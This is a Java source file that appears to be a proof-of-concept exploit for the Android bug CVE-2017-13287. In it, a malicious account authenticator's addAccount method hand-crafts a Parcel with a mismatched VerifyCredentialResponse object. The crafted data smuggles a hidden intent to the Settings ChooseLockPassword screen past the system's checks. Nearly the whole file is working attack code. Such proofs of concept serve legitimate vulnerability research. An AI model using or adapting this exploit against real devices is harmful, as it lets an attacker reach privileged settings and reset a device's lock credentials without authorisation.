package com.example.cve_2017_13287_poc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.util.Log;
import android.net.Uri;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import android.os.Bundle;

public class AuthService extends Service {
    static final String TAG = "AuthService";

    @Override
    public IBinder onBind(Intent intent) {
        return new Authenticator(this).getIBinder();
    }

    private static class Authenticator extends AbstractAccountAuthenticator {
        @Override
        public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
            Bundle evilBundle = new Bundle();
            Parcel bndlData = Parcel.obtain();
            Parcel pcelData = Parcel.obtain();

            // Manipulate the raw data of bundle Parcel
            // Now we replace this right Parcel data to evil Parcel data
            pcelData.writeInt(2); // number of elements in ArrayMap
            /*****************************************/
            // mismatched object
            pcelData.writeString("mismatch");
            pcelData.writeInt(4); // VAL_PACELABLE
            pcelData.writeString("com.android.internal.widget.VerifyCredentialResponse"); // name of Class Loader
            pcelData.writeInt(0); // VerifyCredentialResponse.RESPONSE_OK
            pcelData.writeInt(0); // Size of array (used by VerifyCredentialResponse..createFromParcel)

            pcelData.writeInt(267); //dummy, will hold the string length
            pcelData.writeInt(267); //dummy, will hold the payload length

            Bundle keyBundle = new Bundle();
            keyBundle.putParcelable(AccountManager.KEY_INTENT, new Intent().setClassName("com.android.settings", "com.android.settings.ChooseLockPassword"));
            Parcel keyParcel = Parcel.obtain();
            keyBundle.writeToParcel(keyParcel, 0);
            int keyLen = keyParcel.dataPosition() - 12;

            //As the padding for fake string
            pcelData.writeInt(0x87654321);
            pcelData.writeInt(0x87654321);
            pcelData.writeInt(0x87654321);
            pcelData.writeInt(0x87654321);
            for(int i = 4; i < keyLen / 4 + 4; ++i)
                pcelData.writeInt(i);

            pcelData.appendFrom(keyParcel, 12, keyLen);
            keyParcel.recycle();
            while (pcelData.dataPosition() % 8 != 0)
                pcelData.writeInt(0);

            pcelData.writeInt(0); //PADDING
            pcelData.writeInt(0); //PADDING
            pcelData.writeInt(-1); //VAL_NULL

            ///////////////////////////////////////
            pcelData.writeString("123456"); //length matters
            pcelData.writeInt(0); // VAL_STRING
            pcelData.writeString("PADDING"); //


            int length  = pcelData.dataSize();
            Log.d(TAG, "length is " + Integer.toHexString(length)); //0x3a0
            bndlData.writeInt(length);
            bndlData.writeInt(0x4c444E42);
            bndlData.appendFrom(pcelData, 0, length);
            bndlData.setDataPosition(0);
            evilBundle.readFromParcel(bndlData);

            Parcel testData = Parcel.obtain();
            evilBundle.writeToParcel(testData, 0);
            byte[] raw = testData.marshall();
            try {
                FileOutputStream fos = new FileOutputStream("/sdcard/obj.pcl");
                fos.write(raw);
                fos.close();
            } catch (Exception e){
                e.printStackTrace();
            }

            return evilBundle;
        }

        private Context m_context = null;
        Authenticator(Context context) {
            super(context);
            m_context = context;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return null;
        }

        @Override
        public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) throws NetworkErrorException {
            return null;
        }
    }
}